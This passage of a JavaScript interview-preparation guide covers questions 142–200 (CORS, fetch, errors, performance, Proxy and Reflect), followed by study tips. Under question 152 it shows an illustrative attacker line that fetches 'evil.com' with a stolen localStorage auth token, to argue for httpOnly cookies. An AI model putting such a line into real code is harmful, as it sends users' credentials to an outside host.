| 142 | What is the Observer pattern (Pub/Sub)? | Objects subscribe to events. Publisher notifies all subscribers when event occurs. | Decouples components. Subscribers register interest. Publisher broadcasts to all. Common in event systems. | **Code:** `class EventEmitter {` `  constructor() { this.events = {}; }` `  on(event, fn) {` `    this.events[event] = this.events[event] || [];` `    this.events[event].push(fn);` `  }` `  emit(event, data) {` `    this.events[event]?.forEach(fn => fn(data));` `  }` `}` **Analogy:** Like a newsletter - people subscribe, publisher sends updates to all subscribers at once. |
| 143 | What is CORS? | Cross-Origin Resource Sharing - security mechanism controlling resource access across different origins. | Browsers block requests to different origins (domain/port/protocol) unless server allows it via CORS headers. | **Code:** `// Server must send:` `Access-Control-Allow-Origin: https://example.com` `// Or:` `Access-Control-Allow-Origin: *` `// Browser automatically includes Origin header in request` **Analogy:** Like border control - can't cross without permission from the destination country. |
| 144 | What is the same-origin policy? | Security restriction: scripts can only access resources from same origin (protocol + domain + port). | Prevents malicious sites from reading data from other sites via JavaScript. Origin = protocol + domain + port. | **Code:** `// https://example.com:443` `// Same origin:` `// https://example.com:443/page` `// Different origins:` `// http://example.com (protocol)` `// https://other.com (domain)` `// https://example.com:8080 (port)` **Analogy:** Like apartment building rules - residents can only access their own unit, not neighbors'. |
| 145 | What is `fetch()` API? | Modern promise-based API for making HTTP requests. Replaces XMLHttpRequest. | Returns promise resolving to Response object. More flexible than old XMLHttpRequest. Doesn't reject on HTTP errors (only network failures). | **Code:** `fetch('/api/users')` `  .then(response => {` `    if (!response.ok) throw new Error('HTTP error');` `    return response.json();` `  })` `  .then(data => console.log(data))` `  .catch(error => console.error(error));` **Analogy:** Like ordering online - you get a tracking number (promise) that eventually delivers package (response). |
| 146 | What's the difference between `GET` and `POST` requests? | GET retrieves data, parameters in URL. POST sends data in body, for creating/updating. | GET is idempotent (safe to repeat), cached, length-limited. POST can have large payloads, not cached, used for state changes. | **Code:** `// GET:` `fetch('/api/users?id=123') // Data in URL` `// POST:` `fetch('/api/users', {` `  method: 'POST',` `  body: JSON.stringify({name: 'Alice'}), // Data in body` `  headers: {'Content-Type': 'application/json'}` `})` **Analogy:** GET is asking a question. POST is submitting a form with information. |
| 147 | What is JSON? | JavaScript Object Notation - text format for data exchange. Language-independent. | Supports objects, arrays, strings, numbers, booleans, null. No functions, undefined, dates. Use JSON.stringify/parse for conversion. | **Code:** `const obj = {name: 'Alice', age: 25};` `const json = JSON.stringify(obj); // '{"name":"Alice","age":25}'` `const parsed = JSON.parse(json); // {name: 'Alice', age: 25}` `// Limitations:` `JSON.stringify({fn: () => {}}); // '{}' (functions dropped!)` **Analogy:** Like a universal translator for data - any language can read and write it. |
| 148 | What is `JSON.stringify()` with replacer and space? | Second param filters/transforms values. Third param formats output with indentation. | Replacer can be function or array of keys. Space adds pretty-printing (2 or 4 spaces common). | **Code:** `const obj = {name: 'Alice', password: '123', age: 25};` `// Hide password:` `JSON.stringify(obj, ['name', 'age']);` `// Or:` `JSON.stringify(obj, (key, val) => key === 'password' ? undefined : val);` `// Pretty print:` `JSON.stringify(obj, null, 2);` **Analogy:** Replacer is a censor redacting sensitive info. Space is a formatter making it readable. |
| 149 | What is `try...catch...finally`? | Error handling: try code, catch errors, finally runs regardless. | Try block executes. If error, jumps to catch. Finally always runs (cleanup). Finally runs even if return in try/catch! | **Code:** `try {` `  riskyOperation();` `} catch (error) {` `  console.error('Error:', error.message);` `} finally {` `  cleanup(); // Always runs!` `}` `// Finally even runs with return:` `try { return 1; } finally { console.log('Runs!'); }` **Analogy:** Try is attempting a stunt, catch is the safety net, finally is the camera crew (always films regardless). |
| 150 | What is error propagation? | Uncaught errors bubble up through call stack until caught or crash program. | If function doesn't catch error, it propagates to caller, then caller's caller, etc. Unhandled errors stop execution. | **Code:** `function a() { throw new Error('Oops'); }` `function b() { a(); } // Doesn't catch` `function c() {` `  try { b(); }` `  catch (e) { console.log('Caught in c!'); }` `}` `c(); // Error caught here` **Analogy:** Like hot potato - gets passed up until someone catches it or it hits the ground. |
| 151 | What are custom errors? | Extend Error class to create specific error types for better error handling. | Allows instanceof checks and custom properties. Better than generic Error for large apps. | **Code:** `class ValidationError extends Error {` `  constructor(message) {` `    super(message);` `    this.name = 'ValidationError';` `  }` `}` `try {` `  throw new ValidationError('Invalid input');` `} catch (e) {` `  if (e instanceof ValidationError) { /* handle */ }` `}` **Analogy:** Like labeling packages - "FRAGILE" tells handlers to be extra careful (specific handling). |
| 152 | What is `window.localStorage` vs `sessionStorage` security? | Both vulnerable to XSS attacks. Never store sensitive data like tokens without encryption. | If attacker injects JS, they can read localStorage/sessionStorage. Use httpOnly cookies for sensitive tokens. | **Code:** `// ❌ Vulnerable to XSS:` `localStorage.setItem('authToken', token);` `// Attacker script:` `fetch('evil.com', {body: localStorage.getItem('authToken')});` `// ✅ Better: httpOnly cookie (JS can't access)` **Analogy:** Like writing your password on a sticky note - anyone with access to your desk can see it. |
| 153 | What is `requestAnimationFrame()`? | Schedules callback before next repaint. Optimal for animations (60fps). | Syncs with browser's refresh rate. Pauses when tab hidden (battery-friendly). Better than setTimeout for animations. | **Code:** `function animate() {` `  element.style.left = position + 'px';` `  position += 1;` `  if (position < 500) {` `    requestAnimationFrame(animate); // Schedule next frame` `  }` `}` `requestAnimationFrame(animate);` **Analogy:** Like choreographing dance moves to music beats - perfectly synchronized with the rhythm. |
| 154 | What is event loop phases simplified? | Call stack → microtask queue → macrotask queue → render → repeat. | Executes all synchronous code first, then all microtasks (Promises), then one macrotask (setTimeout), then renders, repeat. | **Code:** `console.log('1'); // Call stack` `setTimeout(() => console.log('2'), 0); // Macrotask` `Promise.resolve().then(() => console.log('3')); // Microtask` `console.log('4'); // Call stack` `// Output: 1, 4, 3, 2` **Analogy:** Like a restaurant - take all orders, prepare VIP meals (microtasks), serve one regular meal (macrotask), clean tables (render). |
| 155 | What is the difference between `null` and `undefined` in practice? | Use `undefined` for uninitialized. Use `null` for intentional absence. | `undefined` means "hasn't been set yet." `null` means "deliberately set to no value." Check for both with `== null`. | **Code:** `let x; // undefined (not initialized)` `let y = null; // explicitly no value` `function f(param = 'default') {}` `f(undefined); // Uses default` `f(null); // Doesn't use default!` `x == null; // true (checks both null and undefined)` **Analogy:** `undefined` is an empty seat (nobody assigned). `null` is a reserved seat with no one sitting (intentionally empty). |
| 156 | What is feature detection? | Check if feature exists before using it. Safer than browser detection. | Use `if (feature)` checks. Better than checking browser name/version. More resilient. | **Code:** `// ✅ Good:` `if ('geolocation' in navigator) {` `  navigator.geolocation.getCurrentPosition(callback);` `}` `// ❌ Bad:` `if (userAgent.includes('Chrome')) { /* unreliable! */ }` **Analogy:** Like asking "do you speak French?" instead of assuming based on someone's looks. |
| 157 | What is progressive enhancement? | Start with basic working version, add advanced features for capable browsers. | Core functionality works everywhere. Enhanced features for modern browsers. Opposite of graceful degradation. | **Code:** `// Basic (works everywhere):` `<a href="/page">Link</a>` `// Enhanced (if JS available):` `if ('fetch' in window) {` `  link.addEventListener('click', (e) => {` `    e.preventDefault();` `    fetch('/page').then(/* SPA navigation */);` `  });` `}` **Analogy:** Like building stairs first, then adding an elevator for those who can use it. |
| 158 | What is `use strict` and why use it? | Enables strict mode: catches errors, prevents bad practices, optimizes better. | No silent failures, no accidental globals, no duplicate params. Catches common mistakes. All modules and classes are strict by default. | **Code:** `"use strict";` `x = 5; // ReferenceError (no var/let/const)` `function f(a, a) {} // SyntaxError (duplicate params)` `delete Object.prototype; // TypeError` `// Classes/modules automatically strict - no need to declare` **Analogy:** Like turning on spell-check - catches mistakes you might miss otherwise. |
| 159 | What is the Temporal Dead Zone (TDZ)? | Period between entering scope and variable declaration where `let`/`const` can't be accessed. | Variables exist but throw ReferenceError if accessed before declaration. Prevents using variables before initialization. | **Code:** `{` `  console.log(x); // ReferenceError (in TDZ)` `  let x = 5; // TDZ ends here` `}` `// vs var:` `{` `  console.log(y); // undefined (hoisted)` `  var y = 5;` `}` **Analogy:** Like a package in transit - it exists but you can't use it until it arrives at your door. |
| 160 | What is `Object.defineProperty()`? | Defines property with fine-grained control: writable, enumerable, configurable, getter/setter. | More control than simple assignment. Can create read-only properties, computed properties, etc. | **Code:** `Object.defineProperty(obj, 'name', {` `  value: 'Alice',` `  writable: false, // Read-only!` `  enumerable: true, // Shows in for...in` `  configurable: false // Can't delete/reconfigure` `});` `obj.name = 'Bob'; // Fails silently (throws in strict)` **Analogy:** Like setting file permissions - read-only, hidden, locked, etc. |

---

**✅ BATCH 4 COMPLETE (Questions 121-160)**

---

## BATCH 5: ADVANCED QUESTIONS 161-200 (Performance, Design, Edge Cases)

| # | Question | Simple Answer (Max 20 words) | Explanation (Why/How - ELI5) | Code Example + Real-Life Analogy |
|---|----------|------------------------------|------------------------------|----------------------------------|
| 161 | What is the difference between `==` type coercion rules? | Complex rules: converts to numbers mostly. Strings, booleans, objects coerce differently. | `==` tries to convert both sides to same type. Generally converts to numbers. Avoid it - use `===` instead. | **Code:** `0 == false; // true (both → 0)` `"0" == false; // true (both → 0)` `null == undefined; // true (special case)` `[] == false; // true ([] → "" → 0)` `[1,2] == "1,2"; // true (weird!)` **Analogy:** Like a translator making questionable choices - sometimes helpful, often confusing. |
| 162 | What are common memory leaks in JavaScript? | Forgotten timers, closures holding references, detached DOM nodes, global variables. | Memory leaks happen when references prevent garbage collection. Clear intervals, remove event listeners, null out references. | **Code:** `// ❌ Leak:` `setInterval(() => { /* never cleared */ }, 1000);` `let data = hugeArray;` `element.addEventListener('click', () => console.log(data)); // Holds reference!` `// ✅ Fix:` `const id = setInterval(fn, 1000);` `clearInterval(id);` **Analogy:** Like leaving lights on in empty rooms - wastes resources until you turn them off. |
| 163 | What is garbage collection? | Automatic memory management. Removes objects with no references. | JS uses mark-and-sweep algorithm. Objects reachable from roots (global, call stack) are kept. Others are freed. | **Code:** `let obj = {data: 'large'};` `obj = null; // Now eligible for GC (no references)` `// Closure can prevent GC:` `function outer() {` `  let big = new Array(1000000);` `  return () => big; // Keeps 'big' alive!` `}` **Analogy:** Like a janitor who removes trash that nobody's using anymore. |
| 164 | What is lazy loading? | Deferring load of resources until needed. Improves initial load time. | Load images/scripts/components only when user scrolls to them or navigates there. Reduces initial bundle size. | **Code:** `// Lazy load image:` `<img loading="lazy" src="image.jpg">` `// Lazy load JS module:` `button.addEventListener('click', async () => {` `  const module = await import('./heavy-feature.js');` `  module.init();` `});` **Analogy:** Like reading a book chapter-by-chapter instead of memorizing the entire book upfront. |
| 165 | What is code splitting? | Breaking bundle into smaller chunks loaded on demand. Reduces initial load. | Splits code by routes, features, or vendor libraries. Loaded when needed, not all upfront. Webpack/Vite do this automatically. | **Code:** `// Dynamic import:` `const loadDashboard = () => import('./Dashboard.js');` `// Route-based splitting:` `const routes = {` `  '/home': () => import('./Home.js'),` `  '/dashboard': () => import('./Dashboard.js')` `};` **Analogy:** Like Netflix downloading episodes as you watch, not the entire season at once. |
| 166 | What is tree shaking? | Removing unused code during build. Relies on ES6 modules. | Build tools analyze imports, remove unused exports. Only works with ES6 modules (static imports). Reduces bundle size. | **Code:** `// utils.js` `export const used = () => 'used';` `export const unused = () => 'unused';` `// app.js` `import {used} from './utils.js';` `// Build: 'unused' is removed from final bundle` **Analogy:** Like shaking a tree to drop dead leaves - only keep what's actually attached (used). |
| 167 | What is the Critical Rendering Path? | Steps browser takes to render page: DOM, CSSOM, Render Tree, Layout, Paint. | Browser parses HTML → builds DOM → loads CSS → builds CSSOM → creates render tree → calculates layout → paints pixels. Optimize each step. | **Code:** `// ❌ Blocks rendering:` `<script src="large.js"></script>` `// ✅ Defer:` `<script src="large.js" defer></script>` `// ✅ Async:` `<script src="analytics.js" async></script>` **Analogy:** Like building a house: blueprint (DOM) → materials (CSSOM) → frame (render tree) → rooms (layout) → paint. |
| 168 | What's the difference between `defer` and `async` script loading? | Both non-blocking. `defer` executes after HTML parse in order. `async` executes ASAP, order not guaranteed. | `defer`: waits for DOM, maintains order. `async`: runs when ready, may execute before DOM complete. Use `defer` for dependencies. | **Code:** `<script src="1.js" defer></script> // Runs after HTML, order: 1→2` `<script src="2.js" defer></script>` `<script src="a.js" async></script> // Runs ASAP, order uncertain` `<script src="b.js" async></script>` **Analogy:** `defer` is "assemble furniture after all pieces arrive, in instruction order." `async` is "use pieces as they arrive." |
| 169 | What is reflow (layout) and repaint? | Reflow recalculates positions/sizes. Repaint redraws pixels. Reflow is more expensive. | Reflow: geometry changes (width, position). Triggers repaint. Repaint: visual changes (color, visibility). Doesn't trigger reflow. Batch DOM changes. | **Code:** `// ❌ Causes multiple reflows:` `el.style.width = '100px';` `el.style.height = '100px';` `el.style.margin = '10px';` `// ✅ Single reflow:` `el.style.cssText = 'width: 100px; height: 100px; margin: 10px';` **Analogy:** Reflow is rearranging furniture (hard). Repaint is changing wall color (easier). |
| 170 | How do you batch DOM reads and writes? | Read all properties first, then write all changes. Prevents layout thrashing. | Reading layout properties forces reflow. Interleaving reads/writes causes multiple reflows. Batch reads together, then writes together. | **Code:** `// ❌ Layout thrashing:` `const h1 = el1.offsetHeight; // Read (reflow)` `el2.style.height = h1 + 'px'; // Write` `const h2 = el2.offsetHeight; // Read (reflow again!)` `// ✅ Batched:` `const h1 = el1.offsetHeight; // Read` `const h2 = el2.offsetHeight; // Read` `el2.style.height = h1 + 'px'; // Write` **Analogy:** Like measuring all rooms first, then painting - not measure, paint, measure, paint. |
| 171 | What is event loop blocking? | Long-running synchronous code blocks event loop. UI freezes. | JavaScript is single-threaded. Long tasks prevent other code from running. Break into chunks with setTimeout or use Web Workers. | **Code:** `// ❌ Blocks UI:` `for (let i = 0; i < 1000000000; i++) { /* heavy work */ }` `// ✅ Non-blocking:` `function processChunk(i) {` `  const end = Math.min(i + 10000, total);` `  for (; i < end; i++) { /* process */ }` `  if (i < total) setTimeout(() => processChunk(i), 0);` `}` **Analogy:** Like a cashier helping one customer for an hour - the entire line waits. |
| 172 | What are Web Workers? | Separate threads for running scripts without blocking UI. No DOM access. | Runs JavaScript in background thread. Communicate via messages. Good for heavy computations. Can't access DOM/window. | **Code:** `// main.js` `const worker = new Worker('worker.js');` `worker.postMessage({data: [1,2,3]});` `worker.onmessage = (e) => console.log(e.data);` `// worker.js` `onmessage = (e) => {` `  const result = heavyComputation(e.data);` `  postMessage(result);` `};` **Analogy:** Like hiring a remote worker - they do tasks independently and send back results. |
| 173 | What is the difference between shallow and deep comparison? | Shallow compares references/primitives. Deep compares nested content recursively. | Shallow: `===` for primitives, reference equality for objects. Deep: recursively compares all nested values. Deep comparison is expensive. | **Code:** `const obj1 = {a: 1, b: {c: 2}};` `const obj2 = {a: 1, b: {c: 2}};` `obj1 === obj2; // false (different references)` `obj1.a === obj2.a; // true (shallow - same primitive)` `// Deep:` `JSON.stringify(obj1) === JSON.stringify(obj2); // true (hacky)` **Analogy:** Shallow is checking house addresses. Deep is inspecting every room inside. |
| 174 | What is object destructuring with renaming? | Extract properties and assign to different variable names using colon. | Syntax: `{oldName: newName}`. Useful for avoiding naming conflicts or improving clarity. | **Code:** `const user = {name: 'Alice', age: 25};` `const {name: userName, age: userAge} = user;` `console.log(userName); // "Alice"` `console.log(name); // ReferenceError!` `// With defaults:` `const {name: n = 'Guest'} = {};` **Analogy:** Like renaming a file while copying it - same content, different label. |
| 175 | What is the Immediately Resolved Promise pattern? | Using `Promise.resolve()` to convert values to promises for consistent async flow. | Wraps synchronous values in promises. Useful for APIs that expect promises. Enables uniform `.then()` chaining. | **Code:** `function getData(useCache) {` `  if (useCache) {` `    return Promise.resolve(cachedData); // Sync → Promise` `  }` `  return fetch('/api/data'); // Already promise` `}` `// Both paths now return promises:` `getData(true).then(data => { /* works */ });` **Analogy:** Like packaging all items the same way, whether fresh (async) or from storage (sync). |
| 176 | What is the `??=` nullish coalescing assignment operator? | Assigns right value only if left is `null` or `undefined`. Short-circuit assignment. | Combines `??` and `=`. Only assigns if current value is nullish. Doesn't assign for `0`, `false`, `""`. | **Code:** `let count = 0;` `count ??= 10; // count stays 0 (not nullish)` `let name;` `name ??= 'Guest'; // name becomes 'Guest' (undefined is nullish)` `// Equivalent to:` `name = name ?? 'Guest';` **Analogy:** Like saying "use my value if I have one, otherwise use this default." |
| 177 | What is optional chaining with function calls? | Safely call methods that might not exist using `?.()`. | If method doesn't exist, returns `undefined` instead of throwing error. Works with dynamic method calls too. | **Code:** `const obj = {greet: () => 'Hello'};` `obj.greet?.(); // "Hello"` `obj.missing?.(); // undefined (no error!)` `// Dynamic:` `obj[methodName]?.();` `// Useful for callbacks:` `onSuccess?.();` **Analogy:** Like saying "ring the doorbell if there is one" instead of assuming there is. |
| 178 | What is the `in` operator with arrays? | Checks if index exists, not value. Sparse arrays have gaps. | `in` checks indices for arrays, not values. Different from `.includes()`. Sparse arrays return false for missing indices. | **Code:** `const arr = ['a', 'b', 'c'];` `1 in arr; // true (index 1 exists)` `5 in arr; // false (index 5 doesn't exist)` `'a' in arr; // false (checks indices, not values!)` `// Sparse:` `const sparse = [1, , 3]; 1 in sparse; // false!` **Analogy:** Like checking if a parking spot number exists, not if a car is parked there. |
| 179 | What is the comma operator in expressions? | Evaluates left-to-right, returns rightmost value. Rarely useful. | All expressions evaluated for side effects, but only last value returned. Mostly seen in for loops. | **Code:** `let x = (1, 2, 3); // x = 3` `// Typical use in for:` `for (let i = 0, j = 10; i < j; i++, j--) {}` `// Can be confusing:` `const a = (console.log('executed'), 42); // a = 42` **Analogy:** Like doing multiple tasks but only reporting the last result. |
| 180 | What is the `void` operator used for? | Evaluates expression, returns `undefined`. Prevents unwanted return values. | Useful for IIFEs to prevent return, or old `javascript:` URLs. Modern code rarely needs it. | **Code:** `void function() { console.log('IIFE'); }();` `// Old usage:` `<a href="javascript:void(0)">Link</a>` `// Ensure undefined:` `const result = void someFunction(); // Always undefined` **Analogy:** Like a shredder - puts something in, nothing useful comes out. |
| 181 | How do you detect if a value is an integer? | Use `Number.isInteger()`. Checks if number and has no fractional part. | Returns true only for actual integers. `NaN`, `Infinity`, strings return false even if they look like integers. | **Code:** `Number.isInteger(42); // true` `Number.isInteger(42.0); // true (same as 42)` `Number.isInteger(42.5); // false` `Number.isInteger('42'); // false (string!)` `Number.isInteger(NaN); // false` **Analogy:** Like checking if a pizza is unsliced (whole number) vs having fractional slices. |
| 182 | What is `Number.isFinite()` vs global `isFinite()`? | `Number.isFinite()` doesn't coerce. Global `isFinite()` converts to number first. | Use `Number.isFinite()` - stricter, no type coercion. Global version converts strings to numbers (misleading). | **Code:** `Number.isFinite(42); // true` `Number.isFinite('42'); // false (doesn't coerce!)` `Number.isFinite(Infinity); // false` `isFinite('42'); // true (coerces to number - avoid!)` **Analogy:** `Number.isFinite()` is strict bouncer. Global `isFinite()` is lenient one who bends rules. |
| 183 | What is the difference between `parseInt()` and `Number()`? | `parseInt()` parses until invalid character. `Number()` converts entire string or fails. | `parseInt()` stops at first non-digit. `Number()` requires whole string to be valid number. `parseInt()` needs radix parameter. | **Code:** `parseInt('42px'); // 42 (stops at 'p')` `Number('42px'); // NaN (invalid)` `parseInt('10', 10); // 10 (decimal)` `parseInt('10', 2); // 2 (binary)` `Number('  42  '); // 42 (trims whitespace)` **Analogy:** `parseInt()` is forgiving reader (gets what it can). `Number()` is strict grader (all or nothing). |
| 184 | What is BigInt and when to use it? | Arbitrary precision integers. Use for numbers larger than `Number.MAX_SAFE_INTEGER` (2^53-1). | Regular numbers lose precision above 2^53. BigInt has unlimited size. Add `n` suffix or use `BigInt()`. Can't mix with regular numbers. | **Code:** `const big = 9007199254740991n; // or BigInt(9007199254740991)` `const tooBig = 9007199254740992; // Lost precision!` `big + 1n; // Works!` `big + 1; // ❌ TypeError (can't mix types)` `BigInt(big) + BigInt(1); // ✅ Must convert` **Analogy:** Like using scientific calculator for very large numbers instead of basic calculator. |
| 185 | What is the difference between `for...in` and `Object.keys()`? | `for...in` iterates inherited properties too. `Object.keys()` returns only own properties. | `for...in` walks prototype chain (unless hasOwnProperty checked). `Object.keys()` returns array of own enumerable keys only. | **Code:** `const obj = {a: 1};` `Object.prototype.inherited = 'yes';` `for (let key in obj) console.log(key); // 'a', 'inherited'` `Object.keys(obj); // ['a'] (own only)` `// Safe for...in:` `for (let key in obj) if (obj.hasOwnProperty(key)) { /* ... */ }` **Analogy:** `for...in` checks your and your parents' belongings. `Object.keys()` checks only yours. |
| 186 | What is the difference between `Object.values()` and `Object.entries()`? | `values()` returns array of values. `entries()` returns array of `[key, value]` pairs. | Both return only own enumerable properties. `entries()` useful for transforming objects or creating Maps. | **Code:** `const obj = {a: 1, b: 2, c: 3};` `Object.values(obj); // [1, 2, 3]` `Object.entries(obj); // [['a', 1], ['b', 2], ['c', 3]]` `// Use entries to create Map:` `const map = new Map(Object.entries(obj));` **Analogy:** `values()` is list of prices. `entries()` is itemized receipt with names and prices. |
| 187 | What is `Object.fromEntries()`? | Converts array of `[key, value]` pairs into object. Opposite of `Object.entries()`. | Useful for transforming Maps to objects, or filtering/mapping object entries then converting back. | **Code:** `const entries = [['a', 1], ['b', 2]];` `Object.fromEntries(entries); // {a: 1, b: 2}` `// From Map:` `const map = new Map([['x', 10]]);` `Object.fromEntries(map); // {x: 10}` `// Transform object:` `Object.fromEntries(Object.entries(obj).filter(([k,v]) => v > 5));` **Analogy:** Like assembling a puzzle from pieces - pairs become complete picture. |
| 188 | What is `Object.getOwnPropertyDescriptor()`? | Returns property descriptor: value, writable, enumerable, configurable, get, set. | Shows full property metadata. Useful for understanding property behavior or cloning with exact attributes. | **Code:** `const obj = {name: 'Alice'};` `Object.getOwnPropertyDescriptor(obj, 'name');` `// {value: 'Alice', writable: true, enumerable: true, configurable: true}` `// For getter:` `const obj2 = {get prop() { return 1; }};` `Object.getOwnPropertyDescriptor(obj2, 'prop');` `// {get: [Function], set: undefined, enumerable: true, ...}` **Analogy:** Like reading detailed file properties - not just content, but permissions and metadata. |
| 189 | What is the difference between enumerable and non-enumerable properties? | Enumerable properties show in `for...in`, `Object.keys()`. Non-enumerable hidden from iteration. | Built-in properties like `toString` are non-enumerable. Created properties are enumerable by default. Control with `Object.defineProperty()`. | **Code:** `const obj = {a: 1};` `Object.defineProperty(obj, 'b', {value: 2, enumerable: false});` `Object.keys(obj); // ['a'] (b is hidden)` `obj.b; // 2 (still accessible!)` `for (let key in obj) console.log(key); // 'a'` **Analogy:** Enumerable is listed in table of contents. Non-enumerable is hidden chapter (exists but not advertised). |
| 190 | What is the Proxy object? | Intercepts and customizes operations on objects (get, set, delete, etc.). | Wraps object with custom behavior. Can validate, log, format, or transform operations. Used in reactivity systems. | **Code:** `const handler = {` `  get(target, prop) {` `    console.log(`Getting ${prop}`);` `    return target[prop];` `  },` `  set(target, prop, value) {` `    console.log(`Setting ${prop} to ${value}`);` `    target[prop] = value;` `  }` `};` `const proxy = new Proxy({}, handler);` **Analogy:** Like a security guard who checks and logs everyone entering/leaving a building. |
| 191 | What is the Reflect API? | Built-in object providing methods to intercept JavaScript operations. Partner to Proxy. | Mirrors Proxy traps as functions. More functional approach than operators. Returns boolean for success instead of throwing. | **Code:** `// Instead of:` `obj[key] = value; delete obj[key];` `// Use:` `Reflect.set(obj, key, value); // Returns boolean` `Reflect.deleteProperty(obj, key); // Returns boolean` `// In Proxy:` `get(target, prop) {` `  return Reflect.get(target, prop); // Default behavior` `}` **Analogy:** Like standardized tools for object manipulation instead of using hands/operators. |
| 192 | What is the difference between `.concat()` and spread for arrays? | `.concat()` is method, returns new array. Spread is syntax, more versatile. | Both create shallow copies and merge arrays. Spread can be used anywhere, concat is array-specific. Performance similar. | **Code:** `const arr1 = [1, 2], arr2 = [3, 4];` `// concat:` `arr1.concat(arr2); // [1, 2, 3, 4]` `arr1.concat(5, 6); // [1, 2, 5, 6]` `// Spread:` `[...arr1, ...arr2]; // [1, 2, 3, 4]` `[...arr1, 5, 6]; // [1, 2, 5, 6]` **Analogy:** Both are staplers - one is traditional tool, other is modern multi-tool. |
| 193 | What is array destructuring with skipping? | Skip elements using empty commas in pattern. | Leave positions blank to ignore values. Useful for extracting specific indices. | **Code:** `const arr = [1, 2, 3, 4, 5];` `const [first, , third, , fifth] = arr;` `// first = 1, third = 3, fifth = 5` `const [, , ...rest] = arr; // rest = [3, 4, 5]` **Analogy:** Like picking specific books from a shelf, ignoring ones in between. |
| 194 | What is nested destructuring? | Extract values from nested structures in single statement. | Can destructure multiple levels deep. Combines object and array destructuring. Powerful but can be hard to read. | **Code:** `const user = {` `  name: 'Alice',` `  address: {city: 'NYC', zip: '10001'}` `};` `const {name, address: {city}} = user;` `// Mixed:` `const data = {items: [{id: 1, val: 'a'}]};` `const {items: [{val}]} = data; // val = 'a'` **Analogy:** Like unpacking boxes inside boxes - open outer box, then inner box, get item. |
| 195 | What is the performance difference between `for` loops? | `for` fastest, `forEach` slower, `for...of` middle. But readability often matters more. | Classic `for` is fastest (direct index). `forEach` has function overhead. `for...of` uses iterators. Differences minor for small arrays. | **Code:** `// Fastest:` `for (let i = 0; i < arr.length; i++) { /* ... */ }` `// Slowest (but cleaner):` `arr.forEach(item => { /* ... */ });` `// Middle ground:` `for (const item of arr) { /* ... */ }` **Analogy:** Like delivery methods: pickup (for) vs courier (forEach). Courier is slower but more convenient. |
| 196 | What is the difference between `Array.of()` and `Array()` constructor? | `Array.of()` creates array with arguments as elements. `Array()` has special case for single number. | `Array(3)` creates empty array of length 3. `Array.of(3)` creates `[3]`. Use `Array.of()` for predictable behavior. | **Code:** `Array(3); // [empty × 3] (length 3)` `Array.of(3); // [3]` `Array(1, 2, 3); // [1, 2, 3]` `Array.of(1, 2, 3); // [1, 2, 3] (same)` **Analogy:** `Array()` is a confusing vending machine. `Array.of()` is straightforward - always gives you what you ask for. |
| 197 | What is function parameter destructuring? | Destructure objects/arrays directly in parameter list. | Cleaner than accessing properties inside function. Can have defaults. Great for option objects. | **Code:** `// Instead of:` `function greet(user) {` `  console.log(user.name);` `}` `// Use:` `function greet({name, age = 18}) {` `  console.log(name);` `}` `greet({name: 'Alice'}); // age defaults to 18` **Analogy:** Like unpacking a package at the door instead of carrying it inside first. |
| 198 | What is the double NOT (`!!`) operator? | Converts any value to boolean. Two negations result in truthy/falsy boolean. | First `!` converts to boolean and inverts. Second `!` inverts back. Same as `Boolean()` but terser. | **Code:** `!!1; // true` `!!0; // false` `!!'hello'; // true` `!!''; // false` `!!null; // false` `// Same as:` `Boolean(1); // true` **Analogy:** Like asking "Is it true that it's not true that this is false?" - complicated way to get truth. |
| 199 | What is the unary plus (`+`) operator? | Converts value to number. Shorthand for `Number()`. | Tries to convert to number. Returns `NaN` for non-numeric strings. Works with strings, booleans, null. | **Code:** `+'42'; // 42` `+'42.5'; // 42.5` `+true; // 1` `+false; // 0` `+null; // 0` `+'hello'; // NaN` `// Same as:` `Number('42'); // 42` **Analogy:** Like a converter box that tries to turn anything into a number. |
| 200 | What is the `delete` operator and its limitations? | Removes property from object. Returns boolean. Doesn't work on variables or non-configurable properties. | Deletes own properties only. Can't delete variables, function parameters, or built-in properties. Returns false in strict mode if fails. | **Code:** `const obj = {a: 1, b: 2};` `delete obj.a; // true, obj = {b: 2}` `delete obj.toString; // true but doesn't delete (inherited)` `let x = 5;` `delete x; // false (can't delete variables)` `delete Math.PI; // false (non-configurable)` **Analogy:** Like an eraser that only works on pencil marks you made, not pen or printed text. |

---

**🎉 ALL 200 QUESTIONS COMPLETE! 🎉**

## SUMMARY

You now have a comprehensive interview preparation guide covering:

### ✅ Beginner (80 Questions)
- JavaScript Core: Variables, data types, operators, scope, hoisting, closures
- Functions & Arrays: Basic methods, IIFE, callbacks
- DOM Basics: querySelector, event handling, storage APIs

### ✅ Intermediate (80 Questions)
- Async Programming: Promises, async/await, Event Loop, microtasks vs macrotasks
- Advanced Arrays: reduce, flatMap, advanced methods
- ES6+ Features: Modules, destructuring, Symbols, generators, Map/Set
- Design Patterns: Module, Singleton, Factory, Observer
- Browser APIs: CORS, fetch, HTTP methods

### ✅ Advanced (40 Questions)
- Performance: Reflow/repaint, lazy loading, code splitting, Web Workers
- Memory Management: Garbage collection, memory leaks
- Edge Cases: Type coercion gotchas, operator behaviors
- Advanced Objects: Proxy, Reflect, property descriptors
- Optimization: Batching DOM operations, critical rendering path

---

## 🎯 HOW TO USE THIS GUIDE

1. **Study in Order**: Start with Batch 1, master each before moving forward
2. **Practice Out Loud**: Explain each answer as if teaching someone
3. **Code Examples**: Type out each code example to build muscle memory
4. **Use Analogies**: Memorize the analogies - they make concepts stick
5. **Daily Review**: Cover 10-15 questions per day, review previous days
6. **Mock Interviews**: Practice answering randomly selected questions in under 60 seconds

---

## 📚 NEXT STEPS

- Practice these questions with a friend or mentor
- Build small projects using these concepts
- Contribute to open source to see real-world usage
- Join coding communities to discuss tricky concepts
- Keep this as a quick reference before interviews

**Good luck with your interviews! 🚀**
